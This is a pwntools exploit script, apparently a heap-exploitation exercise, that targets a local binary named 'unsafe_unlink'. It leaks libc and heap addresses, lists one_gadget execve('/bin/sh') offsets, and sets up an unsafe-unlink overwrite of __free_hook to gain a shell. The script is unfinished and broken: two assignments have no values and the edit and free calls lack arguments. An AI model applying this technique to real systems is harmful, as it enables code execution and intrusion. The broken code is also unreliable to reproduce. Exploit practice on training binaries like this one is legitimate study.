from pwn import *

elf = context.binary = ELF("unsafe_unlink", checksec=True)
libc = elf.libc
context.log_level = "debug"

gs = """continue"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()
io.timeout = 1

io.recvuntil(b"puts() @ ")
puts_leak = int(io.readline(), 16)
log.info(f"puts leak @ {puts_leak:#x}")

libc.address = puts_leak - libc.sym.puts
log.info(f"libc has been rebased @ {libc.address:#x}")

io.recvuntil(b"heap @ ")
heap = int(io.readline(), 16)
log.info(f"heap @ {heap:#x}")

def malloc(size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"", f"{size}".encode())

def edit(index, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"index: ", f"{index}".encode())
    io.sendlineafter(b"data: ", data)

def free(index):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"index: ", f"{index}".encode())

"""
0x3f6be execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x3f712 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xd6311 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
"""
one_gadget = 

# __free_hook 
fd = 

# data for __free_hook
bk = p64(one_gadget)

# size we manipulate the chunks prev_size flag to be
prev_size = 0x90
# size of the chunk
fake_size = 0x90

malloc(0x90)
malloc(0x90)

edit()

free()
free()
io.interactive()
